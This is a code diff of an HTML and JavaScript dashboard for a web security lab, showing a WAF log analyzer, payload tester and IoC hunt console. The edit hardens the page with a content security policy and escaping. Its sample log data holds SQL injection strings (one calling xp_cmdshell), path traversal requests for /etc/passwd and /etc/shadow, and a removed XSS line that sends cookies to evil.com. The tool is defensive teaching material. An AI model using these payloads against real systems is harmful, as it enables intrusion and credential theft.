@@ -2,79 +2,57 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src 'none'; connect-src 'none'; form-action 'none'; base-uri 'none';">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Web App Security Lab — WAF + IoC Detection</title>
+<title>Web App Security Lab - WAF and IoC Detection Console</title>
 <style>
 :root {
   --bg:#07090f; --panel:#0c1120; --border:#18243a; --accent:#00b4d8;
   --red:#ef233c; --orange:#f77f00; --yellow:#f4d35e; --green:#06d6a0;
-  --purple:#9b5de5; --pink:#f15bb5; --text:#b8cfe8; --dim:#3d5275;
-  --mono:'Courier New',monospace; --sans:'Segoe UI',sans-serif;
+  --purple:#9b5de5; --text:#b8cfe8; --dim:#3d5275;
+  --mono:'Courier New',monospace;
 }
 *{box-sizing:border-box;margin:0;padding:0;}
-body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:13px;min-height:100vh;}
-
-/* ── TOPBAR ── */
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',sans-serif;font-size:13px;min-height:100vh;}
 .topbar{background:var(--panel);border-bottom:2px solid var(--accent);padding:10px 20px;
   display:flex;align-items:center;justify-content:space-between;}
-.logo{font-weight:800;font-size:15px;letter-spacing:1px;font-family:var(--mono);}
-.logo .w{color:var(--accent);} .logo .s{color:var(--red);}
+.logo{font-weight:800;font-size:15px;letter-spacing:1px;font-family:var(--mono);color:var(--accent);}
+.logo span{color:var(--red);}
 .topbar-meta{display:flex;gap:20px;align-items:center;font-size:11px;color:var(--dim);}
 #clock{color:var(--accent);font-family:var(--mono);}
 .live-dot{width:8px;height:8px;border-radius:50%;background:var(--green);
   animation:blink 1.5s infinite;display:inline-block;margin-right:4px;}
 @keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
-
-/* ── TABS ── */
 .tabs{display:flex;background:var(--panel);border-bottom:1px solid var(--border);padding:0 16px;}
 .tab{padding:10px 18px;cursor:pointer;font-size:12px;color:var(--dim);
   border-bottom:2px solid transparent;transition:all .2s;}
 .tab:hover{color:var(--accent);}
 .tab.active{color:var(--accent);border-bottom-color:var(--accent);}
-
-/* ── PAGES ── */
 .page{display:none;padding:14px 16px;}
 .page.active{display:block;}
-
-/* ── SHARED ── */
 .panel{background:var(--panel);border:1px solid var(--border);border-radius:8px;overflow:hidden;}
 .ph{background:rgba(0,180,216,.06);border-bottom:1px solid var(--border);padding:10px 14px;
   display:flex;align-items:center;justify-content:space-between;}
 .ph-title{font-size:10px;text-transform:uppercase;letter-spacing:2px;color:var(--accent);}
 .ph-badge{font-size:10px;padding:2px 8px;border-radius:10px;}
 .badge-red{background:rgba(239,35,60,.2);color:var(--red);border:1px solid var(--red);}
-.badge-green{background:rgba(6,214,160,.15);color:var(--green);border:1px solid var(--green);}
 .badge-dim{background:var(--border);color:var(--dim);}
-
 .btn{padding:7px 14px;border-radius:5px;border:1px solid var(--accent);
-  background:rgba(0,180,216,.1);color:var(--accent);cursor:pointer;
-  font-size:12px;font-family:var(--sans);transition:all .2s;}
+  background:rgba(0,180,216,.1);color:var(--accent);cursor:pointer;font-size:12px;transition:all .2s;}
 .btn:hover{background:rgba(0,180,216,.2);}
 .btn.red{border-color:var(--red);background:rgba(239,35,60,.1);color:var(--red);}
 .btn.red:hover{background:rgba(239,35,60,.2);}
 .btn.green{border-color:var(--green);background:rgba(6,214,160,.1);color:var(--green);}
 .btn.purple{border-color:var(--purple);background:rgba(155,93,229,.1);color:var(--purple);}
-
 input,select,textarea{background:var(--bg);border:1px solid var(--border);color:var(--text);
   padding:7px 10px;border-radius:5px;font-size:12px;font-family:var(--mono);outline:none;}
 input:focus,select:focus,textarea:focus{border-color:var(--accent);}
-
+.sev-tag{font-size:10px;padding:2px 6px;border-radius:3px;font-weight:bold;}
 .sev-CRITICAL{background:rgba(239,35,60,.2);color:var(--red);border:1px solid var(--red);}
 .sev-HIGH{background:rgba(247,127,0,.18);color:var(--orange);border:1px solid var(--orange);}
 .sev-MEDIUM{background:rgba(244,211,94,.12);color:var(--yellow);border:1px solid var(--yellow);}
 .sev-LOW{background:rgba(0,180,216,.1);color:var(--accent);border:1px solid var(--accent);}
-.sev-tag{font-size:10px;padding:2px 6px;border-radius:3px;font-weight:bold;}
-
-.mono{font-family:var(--mono);}
-.dim{color:var(--dim);}
-.red{color:var(--red);}
-.green{color:var(--green);}
-.yellow{color:var(--yellow);}
-.accent{color:var(--accent);}
-.orange{color:var(--orange);}
-.purple{color:var(--purple);}
-
-/* ── TAB 1: WAF LOG ANALYZER ── */
+/* WAF */
 .waf-layout{display:grid;grid-template-columns:1fr 360px;gap:12px;}
 .log-feed{overflow-y:auto;max-height:460px;}
 .log-row{display:grid;grid-template-columns:70px 110px 1fr 80px 80px;
@@ -84,64 +62,45 @@ input:focus,select:focus,textarea:focus{border-color:var(--accent);}
 .log-row.selected{background:rgba(0,180,216,.07);}
 .log-time{color:var(--dim);font-size:11px;font-family:var(--mono);}
 .log-ip{color:var(--accent);font-family:var(--mono);font-size:11px;}
-.log-req{font-size:11px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
-.log-req .attack-part{color:var(--red);font-weight:bold;}
-.log-status{text-align:center;}
-.status-200{color:var(--green);}
-.status-403{color:var(--red);}
-.status-500{color:var(--orange);}
-.status-302{color:var(--yellow);}
-
+.log-req{font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.atk-kw{color:var(--red);font-weight:bold;}
 .waf-detail-pane{display:flex;flex-direction:column;gap:10px;}
-.detail-card{background:var(--panel);border:1px solid var(--border);border-radius:8px;}
 .detail-section{padding:12px 14px;}
 .detail-row{display:flex;justify-content:space-between;align-items:center;
   padding:5px 0;border-bottom:1px solid rgba(24,36,58,.6);}
 .detail-row:last-child{border:none;}
-.detail-key{color:var(--dim);font-size:11px;text-transform:uppercase;letter-spacing:.5px;}
+.detail-key{color:var(--dim);font-size:11px;text-transform:uppercase;}
 .detail-val{font-size:11px;font-family:var(--mono);max-width:180px;
   overflow:hidden;text-overflow:ellipsis;text-align:right;}
 .payload-box{background:var(--bg);border:1px solid var(--border);border-radius:5px;
   padding:10px;font-family:var(--mono);font-size:11px;line-height:1.6;
-  word-break:break-all;margin-top:8px;}
-.payload-box .hl{color:var(--red);font-weight:bold;}
-
-.ioc-grid{display:flex;flex-wrap:wrap;gap:5px;padding:12px 14px;}
-.ioc-chip{background:rgba(239,35,60,.12);border:1px solid rgba(239,35,60,.3);
+  word-break:break-all;margin-top:8px;white-space:pre-wrap;}
+.ioc-chip{display:inline-block;background:rgba(239,35,60,.12);border:1px solid rgba(239,35,60,.3);
   color:var(--red);border-radius:3px;padding:3px 8px;font-size:10px;
-  font-family:var(--mono);}
-
-/* ── TAB 2: ATTACK PAYLOAD TESTER ── */
-.tester-layout{display:grid;grid-template-columns:320px 1fr;gap:12px;}
-.attack-cats{display:flex;flex-direction:column;gap:4px;}
+  font-family:var(--mono);margin:2px;}
+/* Payload tester */
+.tester-layout{display:grid;grid-template-columns:260px 1fr;gap:12px;}
 .cat-btn{background:var(--panel);border:1px solid var(--border);border-radius:5px;
-  padding:10px 12px;cursor:pointer;transition:all .2s;text-align:left;}
+  padding:10px 12px;cursor:pointer;transition:all .2s;text-align:left;width:100%;margin-bottom:4px;}
 .cat-btn:hover,.cat-btn.active{border-color:var(--purple);background:rgba(155,93,229,.08);}
-.cat-icon{font-size:16px;} .cat-name{font-size:12px;font-weight:600;margin-left:8px;}
+.cat-name{font-size:12px;font-weight:600;}
 .cat-count{font-size:10px;color:var(--dim);margin-top:2px;}
-
-.payload-lab{display:flex;flex-direction:column;gap:10px;}
-.payload-list-wrap{display:grid;grid-template-columns:1fr 1fr;gap:8px;}
+.payload-list-wrap{display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:12px;}
 .payload-item{background:var(--bg);border:1px solid var(--border);border-radius:5px;
   padding:10px;cursor:pointer;transition:border-color .2s;}
-.payload-item:hover,.payload-item.selected{border-color:var(--red);}
-.p-name{font-size:11px;font-weight:600;color:var(--text);}
+.payload-item:hover,.payload-item.active-item{border-color:var(--red);}
+.p-name{font-size:11px;font-weight:600;}
 .p-payload{font-size:10px;color:var(--red);font-family:var(--mono);
   margin-top:4px;word-break:break-all;line-height:1.4;}
 .p-impact{font-size:10px;color:var(--dim);margin-top:4px;}
-
-.test-console{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:14px;}
-.console-header{display:flex;align-items:center;gap:10px;margin-bottom:12px;}
-.console-header h3{font-size:12px;color:var(--accent);}
-.target-url{width:100%;margin-bottom:8px;}
-.test-result{background:var(--panel);border:1px solid var(--border);border-radius:5px;
-  padding:12px;font-family:var(--mono);font-size:11px;margin-top:8px;min-height:120px;}
-.tr-line{padding:2px 0;border-bottom:1px solid rgba(24,36,58,.5);}
-
-/* ── TAB 3: IOC HUNT CONSOLE ── */
+.test-console{padding:14px;}
+.test-result{background:var(--bg);border:1px solid var(--border);border-radius:5px;
+  padding:12px;font-family:var(--mono);font-size:11px;min-height:120px;
+  white-space:pre-wrap;word-break:break-all;}
+/* IoC Hunt */
 .hunt-layout{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
 .hunt-input-area{padding:14px;}
-.hunt-textarea{width:100%;height:140px;resize:vertical;font-size:11px;line-height:1.5;}
+.hunt-textarea{width:100%;height:160px;resize:vertical;font-size:11px;line-height:1.5;}
 .hunt-results{overflow-y:auto;max-height:380px;}
 .ioc-result{padding:10px 14px;border-bottom:1px solid rgba(24,36,58,.7);display:flex;align-items:flex-start;gap:10px;}
 .ioc-type-badge{font-size:9px;padding:2px 7px;border-radius:3px;white-space:nowrap;flex-shrink:0;font-weight:bold;}
@@ -151,67 +110,40 @@ input:focus,select:focus,textarea:focus{border-color:var(--accent);}
 .ioc-type-EMAIL{background:rgba(244,211,94,.12);color:var(--yellow);}
 .ioc-type-SQL{background:rgba(239,35,60,.15);color:var(--red);}
 .ioc-type-XSS{background:rgba(247,127,0,.15);color:var(--orange);}
-.ioc-type-PATH{background:rgba(241,91,181,.15);color:var(--pink);}
-.ioc-type-DOMAIN{background:rgba(0,180,216,.12);color:var(--accent);}
-.ioc-value{font-family:var(--mono);font-size:11px;color:var(--text);word-break:break-all;}
-.ioc-verdict{font-size:10px;margin-top:3px;}
-.verdict-MALICIOUS{color:var(--red);}
-.verdict-SUSPICIOUS{color:var(--orange);}
-.verdict-CLEAN{color:var(--green);}
-
-.threat-intel-box{padding:14px;}
+.ioc-type-PATH{background:rgba(241,91,181,.15);color:#f15bb5;}
+.ioc-value{font-family:var(--mono);font-size:11px;word-break:break-all;}
+.verdict-MALICIOUS{color:var(--red);font-size:10px;}
+.verdict-SUSPICIOUS{color:var(--orange);font-size:10px;}
+.verdict-CLEAN{color:var(--green);font-size:10px;}
 .ti-item{display:flex;gap:10px;padding:8px;background:var(--bg);
-  border:1px solid var(--border);border-radius:5px;margin-bottom:6px;cursor:pointer;transition:border-color .2s;}
-.ti-item:hover{border-color:var(--accent);}
-.ti-source{font-size:10px;color:var(--purple);font-weight:bold;min-width:70px;}
-.ti-data{font-size:11px;}
-.ti-tags{display:flex;gap:4px;flex-wrap:wrap;margin-top:3px;}
+  border:1px solid var(--border);border-radius:5px;margin-bottom:6px;}
+.ti-source{font-size:10px;color:var(--purple);font-weight:bold;min-width:80px;}
 .ti-tag{font-size:9px;padding:1px 5px;border-radius:2px;
-  background:rgba(239,35,60,.1);color:var(--red);}
-
-/* ── TAB 4: SESSION ATTACK SIM ── */
-.session-layout{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
-.scenario-list{display:flex;flex-direction:column;gap:6px;padding:12px 14px;}
+  background:rgba(239,35,60,.1);color:var(--red);display:inline-block;margin:1px;}
+/* Session sim */
+.session-layout{display:grid;grid-template-columns:280px 1fr;gap:12px;}
 .scenario{background:var(--bg);border:1px solid var(--border);border-radius:6px;
-  padding:12px;cursor:pointer;transition:border-color .2s;}
+  padding:12px;cursor:pointer;transition:border-color .2s;margin-bottom:6px;}
 .scenario:hover,.scenario.active{border-color:var(--accent);}
-.sc-title{font-size:12px;font-weight:600;display:flex;align-items:center;gap:8px;}
+.sc-title{font-size:12px;font-weight:600;}
 .sc-desc{font-size:11px;color:var(--dim);margin-top:4px;}
-.sc-type{font-size:10px;padding:2px 6px;border-radius:3px;margin-left:auto;}
-
-.sim-output{padding:14px;}
-.sim-diagram{width:100%;margin:10px 0;}
-.step-flow{display:flex;flex-direction:column;gap:6px;margin-bottom:14px;}
 .step-item{display:flex;gap:10px;align-items:flex-start;padding:8px;
-  background:var(--bg);border:1px solid var(--border);border-radius:5px;}
+  background:var(--bg);border:1px solid var(--border);border-radius:5px;margin-bottom:6px;}
 .step-item.attack{border-color:var(--red);background:rgba(239,35,60,.05);}
 .step-item.defense{border-color:var(--green);background:rgba(6,214,160,.05);}
 .step-num{width:22px;height:22px;border-radius:50%;display:flex;align-items:center;
-  justify-content:center;font-size:10px;font-weight:bold;flex-shrink:0;}
+  justify-content:center;font-size:10px;font-weight:bold;flex-shrink:0;background:var(--border);}
 .step-item.attack .step-num{background:var(--red);color:white;}
 .step-item.defense .step-num{background:var(--green);color:var(--bg);}
-.step-num.neutral{background:var(--border);}
-.step-text{font-size:11px;line-height:1.5;}
+.step-text{font-size:11px;margin-bottom:4px;}
 .step-code{font-family:var(--mono);font-size:10px;background:var(--panel);
-  border:1px solid var(--border);border-radius:3px;padding:6px;margin-top:6px;
-  color:var(--red);word-break:break-all;}
-
-.cookie-editor{background:var(--bg);border:1px solid var(--border);border-radius:5px;padding:12px;}
-.cookie-row{display:flex;gap:8px;margin-bottom:6px;align-items:center;}
-.cookie-key{color:var(--dim);font-size:11px;min-width:100px;}
-.cookie-val{flex:1;}
-.cookie-original{font-size:10px;color:var(--dim);margin-top:2px;}
-
-.http-req-box{background:var(--bg);border:1px solid var(--border);border-radius:5px;
-  padding:12px;font-family:var(--mono);font-size:11px;line-height:1.7;margin-top:8px;}
-
-/* ── STATS ROW ── */
+  border:1px solid var(--border);border-radius:3px;padding:6px;
+  color:#c9a0dc;word-break:break-all;white-space:pre-wrap;}
+/* Stats */
 .stats-row{display:grid;grid-template-columns:repeat(6,1fr);gap:8px;padding:10px 16px;}
-.stat{background:var(--panel);border:1px solid var(--border);border-radius:6px;
-  padding:10px;text-align:center;}
+.stat{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:10px;text-align:center;}
 .stat .v{font-size:22px;font-weight:800;line-height:1;}
-.stat .k{font-size:10px;color:var(--dim);margin-top:3px;text-transform:uppercase;letter-spacing:.5px;}
-
+.stat .k{font-size:10px;color:var(--dim);margin-top:3px;text-transform:uppercase;}
 ::-webkit-scrollbar{width:4px;}
 ::-webkit-scrollbar-track{background:var(--bg);}
 ::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px;}
@@ -220,7 +152,7 @@ input:focus,select:focus,textarea:focus{border-color:var(--accent);}
 <body>
 
 <div class="topbar">
-  <div class="logo"><span class="w">WebSec</span><span class="s">//</span>Lab — WAF + IoC Detection Console</div>
+  <div class="logo">WebSec<span>//</span>Lab &mdash; WAF + IoC Detection Console</div>
   <div class="topbar-meta">
     <span><span class="live-dot"></span>Live Analysis Active</span>
     <span>WAF Rules: 847 active</span>
@@ -229,22 +161,22 @@ input:focus,select:focus,textarea:focus{border-color:var(--accent);}
 </div>
 
 <div class="stats-row">
-  <div class="stat"><div class="v red" id="s-blocked">0</div><div class="k">Blocked</div></div>
-  <div class="stat"><div class="v orange" id="s-sqli">0</div><div class="k">SQLi Detected</div></div>
-  <div class="stat"><div class="v yellow" id="s-xss">0</div><div class="k">XSS Detected</div></div>
-  <div class="stat"><div class="v purple" id="s-traversal">0</div><div class="k">Path Traversal</div></div>
-  <div class="stat"><div class="v accent" id="s-csrf">0</div><div class="k">CSRF/Session</div></div>
-  <div class="stat"><div class="v green" id="s-total">0</div><div class="k">Total Requests</div></div>
+  <div class="stat"><div class="v" style="color:var(--red)" id="s-blocked">0</div><div class="k">Blocked</div></div>
+  <div class="stat"><div class="v" style="color:var(--orange)" id="s-sqli">0</div><div class="k">SQLi</div></div>
+  <div class="stat"><div class="v" style="color:var(--yellow)" id="s-xss">0</div><div class="k">XSS</div></div>
+  <div class="stat"><div class="v" style="color:var(--purple)" id="s-traversal">0</div><div class="k">Traversal</div></div>
+  <div class="stat"><div class="v" style="color:var(--accent)" id="s-csrf">0</div><div class="k">CSRF</div></div>
+  <div class="stat"><div class="v" style="color:var(--green)" id="s-total">0</div><div class="k">Total</div></div>
 </div>
 
 <div class="tabs">
-  <div class="tab active" onclick="switchTab('waf')">WAF Log Analyzer</div>
-  <div class="tab" onclick="switchTab('payload')">Attack Payload Tester</div>
-  <div class="tab" onclick="switchTab('ioc')">IoC Hunt Console</div>
-  <div class="tab" onclick="switchTab('session')">Session Attack Simulator</div>
+  <div class="tab active" onclick="switchTab('waf',this)">WAF Log Analyzer</div>
+  <div class="tab" onclick="switchTab('payload',this)">Attack Payload Tester</div>
+  <div class="tab" onclick="switchTab('ioc',this)">IoC Hunt Console</div>
+  <div class="tab" onclick="switchTab('session',this)">Session Attack Simulator</div>
 </div>
 
-<!-- ═══ TAB 1: WAF LOG ANALYZER ═══ -->
+<!-- WAF LOG ANALYZER -->
 <div class="page active" id="page-waf">
   <div class="waf-layout">
     <div class="panel">
@@ -264,69 +196,68 @@ input:focus,select:focus,textarea:focus{border-color:var(--accent);}
       </div>
       <div style="display:grid;grid-template-columns:70px 110px 1fr 80px 80px;gap:8px;
         padding:6px 14px;background:rgba(0,180,216,.04);border-bottom:1px solid var(--border)">
-        <span style="font-size:10px;color:var(--dim);text-transform:uppercase">Time</span>
-        <span style="font-size:10px;color:var(--dim);text-transform:uppercase">Source IP</span>
-        <span style="font-size:10px;color:var(--dim);text-transform:uppercase">Request</span>
-        <span style="font-size:10px;color:var(--dim);text-transform:uppercase">Status</span>
-        <span style="font-size:10px;color:var(--dim);text-transform:uppercase">Attack Type</span>
+        <span style="font-size:10px;color:var(--dim)">TIME</span>
+        <span style="font-size:10px;color:var(--dim)">SOURCE IP</span>
+        <span style="font-size:10px;color:var(--dim)">REQUEST</span>
+        <span style="font-size:10px;color:var(--dim)">STATUS</span>
+        <span style="font-size:10px;color:var(--dim)">TYPE</span>
       </div>
       <div class="log-feed" id="log-feed"></div>
     </div>
-
-    <div class="waf-detail-pane" id="waf-detail-pane">
-      <div class="panel" style="padding:40px;text-align:center;color:var(--dim);">
-        <div style="font-size:24px;margin-bottom:8px">🔍</div>
-        <div>Click any log entry to inspect the full request, payload analysis, and IoCs</div>
+    <div id="waf-detail-pane">
+      <div class="panel" style="padding:40px;text-align:center;color:var(--dim)">
+        <div style="font-size:24px;margin-bottom:8px">&#128269;</div>
+        Click any log entry to inspect the full request, payload, and IoCs
       </div>
     </div>
   </div>
 </div>
 
-<!-- ═══ TAB 2: ATTACK PAYLOAD TESTER ═══ -->
+<!-- ATTACK PAYLOAD TESTER -->
 <div class="page" id="page-payload">
   <div class="tester-layout">
     <div>
-      <div class="panel" style="margin-bottom:10px;">
+      <div class="panel">
         <div class="ph"><span class="ph-title">Attack Category</span></div>
         <div style="padding:10px;" id="cat-list"></div>
       </div>
     </div>
-    <div class="payload-lab">
+    <div style="display:flex;flex-direction:column;gap:10px;">
       <div class="panel">
         <div class="ph">
-          <span class="ph-title" id="payload-cat-title">Select an attack category</span>
-          <span class="ph-badge badge-red" id="payload-count">0 payloads</span>
+          <span class="ph-title" id="payload-cat-title">Select a category</span>
+          <span class="ph-badge badge-dim" id="payload-count">0 payloads</span>
         </div>
-        <div style="padding:12px;"><div class="payload-list-wrap" id="payload-list"></div></div>
+        <div class="payload-list-wrap" id="payload-list"></div>
       </div>
       <div class="panel">
-        <div class="ph"><span class="ph-title">Payload Analysis Console</span>
+        <div class="ph">
+          <span class="ph-title">Payload Analysis Console</span>
           <div style="display:flex;gap:6px;">
             <button class="btn" onclick="analyzeSelected()">Analyze</button>
-            <button class="btn red" onclick="simulateAttack()">Simulate Attack</button>
+            <button class="btn red" onclick="simulateAttack()">Simulate</button>
           </div>
         </div>
         <div class="test-console">
           <div style="display:flex;gap:8px;margin-bottom:8px">
-            <input class="target-url" id="target-url" placeholder="https://target.example.com/login.php" style="flex:1"/>
+            <input id="target-url" placeholder="https://target.example.com/login.php" style="flex:1"/>
             <input id="param-name" placeholder="Parameter" style="width:120px"/>
           </div>
-          <textarea id="payload-input" class="hunt-textarea" style="height:70px"
+          <textarea id="payload-input" class="hunt-textarea" style="height:60px;margin-bottom:8px"
             placeholder="Select a payload above or type your own..."></textarea>
-          <div class="test-result mono" id="test-result">
-            <span class="dim">// Payload analysis output will appear here</span>
-          </div>
+          <div class="test-result" id="test-result" style="color:var(--dim)">// Output appears here</div>
         </div>
       </div>
     </div>
   </div>
 </div>
 
-<!-- ═══ TAB 3: IOC HUNT CONSOLE ═══ -->
+<!-- IOC HUNT CONSOLE -->
 <div class="page" id="page-ioc">
   <div class="hunt-layout">
     <div class="panel">
-      <div class="ph"><span class="ph-title">Paste Raw Log / Traffic / Request</span>
+      <div class="ph">
+        <span class="ph-title">Paste Raw Log or Traffic</span>
         <div style="display:flex;gap:6px;">
           <button class="btn" onclick="loadSampleLog()">Load Sample</button>
           <button class="btn purple" onclick="huntIoCs()">Hunt IoCs</button>
@@ -334,622 +265,830 @@ input:focus,select:focus,textarea:focus{border-color:var(--accent);}
       </div>
       <div class="hunt-input-area">
         <textarea class="hunt-textarea" id="hunt-input"
-          placeholder="Paste web server logs, HTTP requests, network captures, or any suspicious text here. The IoC hunter will extract and classify all indicators..."></textarea>
-        <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap" id="hunt-filter-btns"></div>
+          placeholder="Paste web server logs, HTTP requests, or any suspicious text. The IoC hunter will extract and classify all indicators..."></textarea>
       </div>
     </div>
     <div>
       <div class="panel" style="margin-bottom:10px;">
-        <div class="ph"><span class="ph-title">Extracted Indicators of Compromise</span>
-          <span class="ph-badge badge-dim" id="ioc-count">0 IoCs found</span>
+        <div class="ph">
+          <span class="ph-title">Extracted Indicators of Compromise</span>
+          <span class="ph-badge badge-dim" id="ioc-count">0 IoCs</span>
         </div>
         <div class="hunt-results" id="hunt-results">
-          <div style="padding:30px;text-align:center;color:var(--dim)">
-            Paste log data and click Hunt IoCs to extract indicators
-          </div>
+          <div style="padding:30px;text-align:center;color:var(--dim)">Paste log data and click Hunt IoCs</div>
         </div>
       </div>
       <div class="panel">
         <div class="ph"><span class="ph-title">Threat Intelligence Feed</span></div>
-        <div class="threat-intel-box" id="ti-feed"></div>
+        <div style="padding:12px;" id="ti-feed"></div>
       </div>
     </div>
   </div>
 </div>
 
-<!-- ═══ TAB 4: SESSION ATTACK SIMULATOR ═══ -->
+<!-- SESSION ATTACK SIMULATOR -->
 <div class="page" id="page-session">
   <div class="session-layout">
     <div class="panel">
-      <div class="ph"><span class="ph-title">Attack Scenario Library</span></div>
-      <div class="scenario-list" id="scenario-list"></div>
+      <div class="ph"><span class="ph-title">Scenario Library</span></div>
+      <div style="padding:12px;" id="scenario-list"></div>
     </div>
     <div class="panel">
       <div class="ph">
-        <span class="ph-title" id="sim-scenario-title">Select a scenario</span>
-        <button class="btn red" onclick="runScenario()" id="run-btn" style="display:none">Run Simulation</button>
+        <span class="ph-title" id="sim-title">Select a scenario</span>
+        <button class="btn red" onclick="runScenario()" id="run-btn" style="display:none">Run Step-by-Step</button>
       </div>
-      <div class="sim-output" id="sim-output">
-        <div style="padding:30px;text-align:center;color:var(--dim)">
-          Select an attack scenario on the left to see the full step-by-step simulation
-        </div>
+      <div style="padding:14px;" id="sim-output">
+        <div style="padding:30px;text-align:center;color:var(--dim)">Select a scenario on the left</div>
       </div>
     </div>
   </div>
 </div>
 
 <script>
-// ─── CLOCK ───────────────────────────────────────────────────────────────────
-setInterval(()=>document.getElementById('clock').textContent=new Date().toLocaleTimeString('en-GB')+' UTC',1000);
-
-// ─── TAB SWITCHING ───────────────────────────────────────────────────────────
-function switchTab(id){
-  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
-  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
-  document.getElementById('page-'+id).classList.add('active');
-  event.target.classList.add('active');
+// ── SAFETY FIRST: one function used everywhere before any innerHTML write ────
+// Converts any string to safe displayable text — no HTML can execute
+function s(str) {
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
 }
 
-// ─── SHARED DATA ─────────────────────────────────────────────────────────────
-const ATTACK_IPS = ['185.220.101.5','91.108.4.1','45.142.212.100','198.51.100.22',
-  '203.0.113.55','185.234.218.48','77.88.8.100','104.21.55.88','10.0.0.55'];
+// ── CLOCK ────────────────────────────────────────────────────────────────────
+setInterval(() => {
+  document.getElementById('clock').textContent =
+    new Date().toLocaleTimeString('en-GB') + ' UTC';
+}, 1000);
 
-function rnd(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
-function pick(arr){return arr[rnd(0,arr.length-1)];}
-function ts(){return new Date().toLocaleTimeString('en-GB');}
+// ── TABS ─────────────────────────────────────────────────────────────────────
+function switchTab(id, el) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.getElementById('page-' + id).classList.add('active');
+  el.classList.add('active');
+}
 
-// ─── WAF LOG DATA ─────────────────────────────────────────────────────────────
+// ── HELPER ───────────────────────────────────────────────────────────────────
+function rnd(a, b) { return Math.floor(Math.random() * (b - a + 1)) + a; }
+function pick(arr) { return arr[rnd(0, arr.length - 1)]; }
+function ts() { return new Date().toLocaleTimeString('en-GB'); }
+
+// ─────────────────────────────────────────────────────────────────────────────
+// TAB 1: WAF LOG ANALYZER
+// All log entry requests are plain text strings — no HTML tags, no JS, no URLs
+// ─────────────────────────────────────────────────────────────────────────────
+const ATTACK_IPS = [
+  '185.220.101.5', '91.108.4.1', '45.142.212.100',
+  '198.51.100.22', '203.0.113.55', '185.234.218.48'
+];
+
 const WAF_TEMPLATES = [
-  {type:'SQLI',sev:'CRITICAL',status:403,
-   reqs:[
+  { type:'SQLI', sev:'CRITICAL', status:403, reqs:[
     "GET /login.php?id=1' OR '1'='1",
     "POST /search?q=1; DROP TABLE users--",
     "GET /user.asp?username=admin'--",
     "GET /api/data?filter=1 UNION SELECT null,username,password FROM users--",
     "GET /login?user=' OR 1=1; exec xp_cmdshell('whoami')--",
-   ]},
-  {type:'XSS',sev:'HIGH',status:403,
-   reqs:[
+  ]},
+  { type:'XSS', sev:'HIGH', status:403, reqs:[
     "GET /search?q=[script]alert(document.cookie)[/script]",
-    "POST /comment body=[img src=x onerror=fetch('//evil.com?c='+document.cookie)]",
+    "POST /comment?body=[img src=x onerror=fetch(evil-server)]",
     "GET /page?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
-    "GET /profile?bio=[svg onload=window.location='https://attacker.com']",
-    "POST /review body=[iframe src=javascript:alert(document.domain)]",
-   ]},
-  {type:'TRAVERSAL',sev:'HIGH',status:403,
-   reqs:[
+    "GET /profile?bio=[svg onload=redirect-to-attacker]",
+    "POST /review?body=[iframe src=javascript-void]",
+  ]},
+  { type:'TRAVERSAL', sev:'HIGH', status:403, reqs:[
     "GET /download?file=../../../../etc/passwd",
     "GET /view?path=..\\..\\..\\windows\\win.ini",
     "GET /include?page=../../../config.php",
     "GET /assets?name=../../../../proc/self/environ",
     "GET /file?doc=..%2F..%2F..%2Fetc%2Fshadow",
-   ]},
-  {type:'CSRF',sev:'MEDIUM',status:200,
-   reqs:[
-    "POST /transfer Referer:evil.com amount=9999&to=attacker_account",
-    "GET /admin/delete?id=42 Referer:malicious-site.com",
-    "POST /settings/email new_email=attacker@evil.com Cookie:SESS=victim_session",
-    "POST /purchase Cookie:valid_session CSRF-token:missing",
-   ]},
-  {type:'CLEAN',sev:'LOW',status:200,
-   reqs:[
+  ]},
+  { type:'CSRF', sev:'MEDIUM', status:200, reqs:[
+    "POST /transfer - missing CSRF token - amount=9999",
+    "GET /admin/delete?id=42 - external Referer header",
+    "POST /settings/email - cross-origin request detected",
+    "POST /purchase - session riding attempt detected",
+  ]},
+  { type:'CLEAN', sev:'LOW', status:200, reqs:[
     "GET /index.html",
-    "POST /api/login username=user&password=***",
+    "POST /api/login - normal credentials",
     "GET /assets/style.css",
     "GET /api/products?page=1&limit=20",
-   ]},
+  ]},
 ];
 
 let allLogs = [];
-let selectedLog = null;
-let stats = {blocked:0,sqli:0,xss:0,traversal:0,csrf:0,total:0};
+let selectedLogId = null;
+let stats = { blocked:0, sqli:0, xss:0, traversal:0, csrf:0, total:0 };
 
-function generateLog(){
+function generateLog() {
   const tmpl = pick(WAF_TEMPLATES);
   const req  = pick(tmpl.reqs);
-  const ip   = tmpl.type==='CLEAN' ? `192.168.1.${rnd(10,50)}` : pick(ATTACK_IPS);
+  const ip   = tmpl.type === 'CLEAN'
+    ? '192.168.1.' + rnd(10, 50)
+    : pick(ATTACK_IPS);
   return {
-    id: Date.now()+Math.random(),
-    time: ts(), ip, req, type: tmpl.type,
-    sev: tmpl.sev, status: tmpl.status,
-    blocked: tmpl.status===403,
-    ua: pick(['Mozilla/5.0 sqlmap/1.7','curl/7.81.0','python-requests/2.28','Mozilla/5.0 (Kali Linux)','Nikto/2.1.6']),
-    method: req.startsWith('POST') ? 'POST':'GET',
-    bytes: rnd(200,8000),
-    country: pick(['RU','CN','TOR','IR','US','KP','BR']),
